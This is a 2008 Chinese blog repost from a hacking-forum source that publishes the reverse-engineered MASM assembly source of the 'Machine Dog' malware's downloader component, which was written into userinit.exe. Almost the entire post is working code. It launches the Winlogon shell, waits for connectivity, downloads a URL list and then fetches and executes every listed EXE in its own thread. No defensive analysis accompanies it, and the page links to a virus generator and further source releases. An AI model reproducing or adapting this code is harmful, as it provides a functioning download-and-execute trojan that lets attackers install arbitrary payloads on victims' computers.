---
title: 机器狗写入到userinit.exe文件的下载者源码
description: ASM;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>;机器狗写入到userinit.exe文件的恶意代码;bynaitm(http://hi.baidu.com/naitm);>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.386.modelflat,stdcalloptioncasemap:none
date: 2008-02-24 10:58:50
category: 技术文章
tags: ['病毒Virus', '源码']
post_id: 381
alias: jiqigou-xieru-userinit.exe-yuanma
ViewNums: 5228
---

文章作者：naitm
信息来源：邪恶八进制信息安全团队（www.eviloctal.com）
文章备注：从IDA中复制，稍作修改所得。
ASM
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 机器狗写入到userinit.exe文件的恶意代码
; by naitm([http://hi.baidu.com/naitm](http://hi.baidu.com/naitm "http://hi.baidu.com/naitm"))
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
.386
.model flat,stdcall
option casemap:none
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; Include 文件定义
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
include windows.inc
include user32.inc
includelib user32.lib
include kernel32.inc
includelib kernel32.lib
include Advapi32.inc
includelib Advapi32.lib
include wininet.inc
includelib wininet.lib
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 数据段
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
.data
nThreadCount dd 0
g_ThreadCount dd 0
PathName db '.',0
szAgent db 'Shell',0
szUser32Dll db 'user32.dll',0
szLoadRemoteFonts db 'LoadRemoteFonts',0
szSubKey db 'SOFTWAREMicrosoftWindows NTCurrentVersionWinlogon',0
szUrlList db 'http://127.0.0.1/cert.cer&#39;,0
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
; 代码段
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
.code
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_RunIt proc @lpExePath

local @ProcessInformation:PROCESS_INFORMATION
local @StartupInfo:STARTUPINFO

invoke GetStartupInfo,addr @StartupInfo
invoke CreateProcess,0,@lpExePath,0,0,0,20h,0,0,addr @StartupInfo,addr @ProcessInformation
.if eax == 0
invoke CloseHandle,@ProcessInformation.hThread
invoke CloseHandle,@ProcessInformation.hProcess
.endif

leave
retn 4
_RunIt endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_DownloadFile proc @lpURL,@lpSaveFile,@Buffer

local @hInternet,@hInternetFile,@hLocalFile,@nNumberOfBytesToWrite,@NumberOfBytesWritten,@nWriteCount
local @lpbuffer[200h]:BYTE

xor eax, eax
mov @nWriteCount, eax
invoke InternetOpen,addr szAgent,0,0,0,0
.if eax != 0
mov @hInternet, eax
invoke InternetSetOption,@hInternet,2,@Buffer,4
invoke InternetSetOption,@hInternet,6,@Buffer,4
invoke InternetOpenUrl,@hInternet,@lpURL,0,0,200000h,0
.if eax != 0
mov @hInternetFile, eax
mov @nNumberOfBytesToWrite, 0
mov @NumberOfBytesWritten, 200h
invoke HttpQueryInfo,@hInternetFile,13h,addr @lpbuffer,
addr @NumberOfBytesWritten,addr @nNumberOfBytesToWrite
.if eax != 0
invoke CreateFile,@lpSaveFile,40000000h,0,0,4,0,0
.if eax != 0FFFFFFFFh
mov @hLocalFile, eax
.while TRUE
mov @nNumberOfBytesToWrite, 0
invoke InternetReadFile,@hInternetFile,addr @lpbuffer,200h,addr @nNumberOfBytesToWrite
.break .if (!eax)
.break .if (@nNumberOfBytesToWrite==0)
inc @nWriteCount
invoke WriteFile,@hLocalFile,addr @lpbuffer,@nNumberOfBytesToWrite,
addr @NumberOfBytesWritten,0
.endw
invoke SetEndOfFile,@hLocalFile
invoke CloseHandle,@hLocalFile
.endif
.endif
invoke InternetCloseHandle,@hInternetFile
.endif
invoke InternetCloseHandle,@hInternet
.endif
mov eax, @nWriteCount
leave
retn 0Ch

_DownloadFile endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_DownloadEXERunIt proc @lpURL

local @DownTimes
local @TempFileName[204h]:BYTE
local @TempFileName2[204h]:BYTE
local @szUrl[104h]:BYTE

mov @DownTimes, 3Ch
invoke lstrcpy,addr @szUrl,@lpURL
invoke RtlZeroMemory,addr @TempFileName,204
invoke GetTempFileName,offset PathName,0,0,addr @TempFileName
invoke lstrcpy,addr @TempFileName2,addr @TempFileName

DownloadNxTime:
invoke _DownloadFile,addr @szUrl,addr @TempFileName,1388h
or eax, eax
jz DownloadFailed
invoke lstrcpy,addr @TempFileName,addr @TempFileName2
invoke _RunIt,addr @TempFileName
jmp DownloadEnd
; ---------------------------------------------------------------------------

DownloadFailed:
invoke Sleep,3E8h
dec @DownTimes
jnz DownloadNxTime

DownloadEnd:
dec nThreadCount
leave
retn 4
_DownloadEXERunIt endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
start:
main proc

local hKey,hObject,hFile,lpBaseAddress,ThreadId
local szShellValue[104h]:BYTE

invoke LoadLibrary,offset szUser32Dll
or eax, eax
jz RegQueryShell
invoke GetProcAddress,eax,offset szLoadRemoteFonts
or eax, eax
jz RegQueryShell
call eax

RegQueryShell:

invoke RegOpenKeyEx,80000002h,offset szSubKey,0,20019h,addr hKey
or eax, eax
jnz TestInternet
mov ThreadId, 104h
invoke RtlZeroMemory,addr szShellValue,104h
invoke RegQueryValueEx,hKey,offset szAgent,0,0,addr szShellValue,addr ThreadId
invoke _RunIt,addr szShellValue
invoke RegCloseKey,hKey

TestInternet:

invoke Sleep,3E8h
invoke InternetGetConnectedState,addr ThreadId,0
or eax, eax
jnz InternetConnect_OK
jmp TestInternet
; ---------------------------------------------------------------------------

InternetConnect_OK:
invoke RtlZeroMemory,addr szShellValue,104h
invoke GetTempFileName,offset PathName,0,0,addr szShellValue

DownList:

invoke Sleep,3E8h
invoke _DownloadFile,offset szUrlList,addr szShellValue,1388h
or eax, eax
jz DownListFailed

mov nThreadCount, 0
invoke CreateFile,addr szShellValue,GENERIC_READ,0,0,3,0,0
cmp eax, INVALID_HANDLE_VALUE
jz ReaptDownList

mov hFile, eax
invoke GetFileSize,hFile,0
cmp eax, 0Fh
jnb BeginDownEXE
invoke CloseHandle,hFile
jmp DownList
; ---------------------------------------------------------------------------

BeginDownEXE:
invoke CreateFileMapping,hFile,0,2,0,0,0
or eax, eax
jz CreateMapFailed
mov hObject, eax
invoke MapViewOfFile,eax,4,0,0,0
or eax, eax
jz MapViewFailed

mov lpBaseAddress, eax
mov esi, eax

loc_4005E1:
lea edi, szShellValue
push 104h
push edi
call RtlZeroMemory

WetherNewLine:
lodsb
cmp al, 0Ah
jnz loc_4005F8
lodsb

loc_4005F8:
cmp al, 0Dh
jz loc_400605
stosb
or al, al
jz UrlListEnd
jmp WetherNewLine
; ---------------------------------------------------------------------------
jmp UrlListEnd
; ---------------------------------------------------------------------------

loc_400605:
cmp szShellValue, 0
jz NextLine
inc nThreadCount
invoke CreateThread,0,0,offset _DownloadEXERunIt,addr szShellValue,0,addr ThreadId
invoke CloseHandle,eax
invoke Sleep,64h

NextLine:
jmp loc_4005E1
; ---------------------------------------------------------------------------

UrlListEnd:

invoke UnmapViewOfFile,lpBaseAddress

MapViewFailed:
invoke CloseHandle,hObject

CreateMapFailed:
invoke CloseHandle,hFile
jmp WetherTreadend
; ---------------------------------------------------------------------------

ReaptDownList:
jmp DownList
; ---------------------------------------------------------------------------
jmp WetherTreadend
; ---------------------------------------------------------------------------

DownListFailed:
jmp DownList
; ---------------------------------------------------------------------------

WetherTreadend:

cmp nThreadCount, 0
jz ExitProgram
invoke Sleep,64h
jmp WetherTreadend
; ---------------------------------------------------------------------------

ExitProgram:
invoke ExitProcess,0

main endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
end start

相关文章：

[机器狗病毒生成器](/blog/jiqigou-shengchengqi)

[机器狗病毒EXE源码发布](/blog/jiqigou-bingdu-exe-yuanma)

